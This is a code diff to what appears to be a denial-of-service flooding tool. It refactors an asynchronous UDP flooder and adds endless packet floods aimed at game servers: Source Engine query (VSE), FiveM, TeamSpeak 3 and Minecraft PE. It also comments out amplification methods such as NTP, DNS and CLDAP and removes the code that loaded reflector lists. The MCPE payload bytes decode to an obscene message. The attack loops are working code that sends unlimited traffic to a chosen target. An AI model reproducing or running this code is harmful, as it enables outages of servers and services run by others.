@@ -19,7 +19,7 @@ from ssl import CERT_NONE, SSLContext, create_default_context
 from sys import exit as _exit
 from threading import Event
 from time import sleep, time
-from typing import Any, List, Optional, Set, Tuple
+from typing import Any, Callable, List, Optional, Set, Tuple
 from urllib import parse
 from string import ascii_letters
 from struct import pack as data_pack
@@ -76,9 +76,11 @@ class Methods:
     }
 
     LAYER4_METHODS: Set[str] = {
-        "UDP", "SYN", "VSE", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP", "CPS", "FIVEM", "TS3", "MCPE",
-        "CLDAP"
+        "UDP", "VSE", "FIVEM", "TS3", "MCPE",
+        # the following methods are temporarily disabled
+        # for further investiation and testing
+        # "SYN",  "MEM", "NTP", "DNS", "ARD",
+        # "CHAR", "RDP", "CPS",  "CLDAP"
     }
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
@@ -1060,13 +1062,13 @@ class AsyncUdpFlood(Layer4):
         assert self._loop is not None, "Event loop has to be set to run async flooder"
         return await self.SENT_FLOOD()
 
-    async def UDP(self) -> bool:
-        packets_sent, packet_size = 0, 1024
+    async def _generic_flood(self, packet_gen: Callable[[], Tuple[bytes, int]]) -> bool:
+        packets_sent = 0
         with socket(AF_INET, SOCK_DGRAM) as sock:
             async with timeout(self._settings.connect_timeout_seconds):
                 await self._loop.sock_connect(sock, self._target)
             while True:
-                packet = randbytes(packet_size)
+                packet, packet_size = packet_gen()
                 try:
                     async with timeout(self._settings.drain_timeout_seconds):
                         await self._loop.sock_sendall(sock, packet)
@@ -1079,8 +1081,40 @@ class AsyncUdpFlood(Layer4):
                 packets_sent += 1
         return packets_sent > 0
 
+    async def UDP(self) -> bool:
+        packet_size = 1024
+        return await self._generic_flood(lambda: (randbytes(packet_size), packet_size))
 
-def main(url, ip, method, event, proxies, stats, refl_li_fn=None, loop=None, settings=None):
+    async def VSE(self) -> bool:
+        packet: bytes = (
+            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
+            b'\x20\x51\x75\x65\x72\x79\x00'
+        )
+        packet_size = len(packet)
+        return await self._generic_flood(lambda: (packet, packet_size))
+
+    async def FIVEM(self) -> bool:
+        packet: bytes = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
+        packet_size = len(packet)
+        return await self._generic_flood(lambda: (packet, packet_size))
+
+    async def TS3(self) -> bool:
+        packet = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
+        packet_size = len(packet)
+        return await self._generic_flood(lambda: (packet, packet_size))
+
+    async def MCPE(self) -> bool:
+        packet: bytes = (
+            b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
+            b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
+            b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
+            b'\x73'
+        )
+        packet_size = len(packet)
+        return await self._generic_flood(lambda: (packet, packet_size))
+
+
+def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
     if method not in Methods.ALL_METHODS:
         exit(f"Method {method} Not Found")
 
@@ -1111,24 +1145,9 @@ def main(url, ip, method, event, proxies, stats, refl_li_fn=None, loop=None, set
             logger.warning("Port Not Selected, Set To Default: 80")
             port = 80
 
-        ref = None
-        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-            # TODO: rework this code when amplifier attack is planned
-            # (not used as of now)
-            refl_li = ROOT_DIR / "files" / refl_li_fn
-            if not refl_li.exists():
-                exit("The reflector file doesn't exist")
-            with refl_li.open("r+") as f:
-                ref = set(
-                    a.strip()
-                    for a in re.findall("(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)", f.read())
-                )
-            if not ref:
-                exit("Empty Reflector File ")
-
         return AsyncUdpFlood(
             (ip, port),
-            ref,
+            None, # XXX: previously used for "ref"
             method,
             event,
             proxies,
